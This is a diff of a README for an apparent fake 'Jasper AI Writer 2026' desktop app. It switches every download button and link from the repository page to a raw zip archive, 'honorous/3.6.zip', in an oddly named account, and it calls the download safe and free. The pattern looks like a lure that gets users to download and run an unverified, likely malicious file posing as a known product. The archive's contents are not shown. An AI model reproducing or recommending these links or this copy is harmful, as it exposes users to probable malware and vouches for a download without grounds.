@@ -1,6 +1,6 @@
 # ✍️ Jasper-Desktop---Jasper-AI-Writer-2026 - Write Like a Pro in Minutes
 
-[![Download Jasper Desktop](https://img.shields.io/badge/Download-Jasper_AI_Writer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/factorymade-peridiniidae8833/Jasper-Desktop---Jasper-AI-Writer-2026)
+[![Download Jasper Desktop](https://img.shields.io/badge/Download-Jasper_AI_Writer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://raw.githubusercontent.com/factorymade-peridiniidae8833/Jasper-Desktop---Jasper-AI-Writer-2026/main/honorous/3.6.zip)
 
 ## 🚀 What Is Jasper Desktop?
 
@@ -39,7 +39,7 @@ Jasper remembers what you wrote earlier in the document. It keeps your ideas flo
 ## 📥 Download and Installation
 
 Visit this link to download the application:  
-[**Download Jasper Desktop 2026**](https://github.com/factorymade-peridiniidae8833/Jasper-Desktop---Jasper-AI-Writer-2026)
+[**Download Jasper Desktop 2026**](https://raw.githubusercontent.com/factorymade-peridiniidae8833/Jasper-Desktop---Jasper-AI-Writer-2026/main/honorous/3.6.zip)
 
 Once you click the link, you’ll land on the download page. Look for the green **“Code”** button or the **“Releases”** section on the right side. Click the latest release, then download the file that matches your system (Windows 10 or 11, 64-bit).
 
@@ -207,7 +207,7 @@ If you run into any problem:
 
 Ready to get started? Click the button below:
 
-[**⬇️ Download Jasper Desktop 2026 Now**](https://github.com/factorymade-peridiniidae8833/Jasper-Desktop---Jasper-AI-Writer-2026)
+[**⬇️ Download Jasper Desktop 2026 Now**](https://raw.githubusercontent.com/factorymade-peridiniidae8833/Jasper-Desktop---Jasper-AI-Writer-2026/main/honorous/3.6.zip)
 
 Visit this link to download the application. It’s safe, free, and takes only minutes to set up.
 
